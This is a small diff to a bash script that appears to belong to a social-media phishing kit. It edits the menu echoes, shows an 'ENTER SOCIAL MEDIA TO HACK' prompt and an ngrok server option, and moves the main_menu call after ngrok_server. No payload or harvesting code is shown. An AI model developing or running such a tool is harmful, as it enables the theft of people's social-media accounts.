@@ -25,12 +25,12 @@ command -v openssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's no
 
 main_menu() {
 
-echo
-echo
-echo
-echo
-echo
-echo
+echo "01"
+echo "02"
+echo "03"
+echo "04"
+echo "05"
+echo "06"
 read -p $red "ENTER SOCIAL MEDIA TO HACK " hug
 
 if [[ $hug == 1 || $hug == 01 ]]; then
@@ -212,5 +212,5 @@ echo -e $red "[02]   >    Ngrok"
 }
 
 dependencies
-main_menu
 ngrok_server
+main_menu
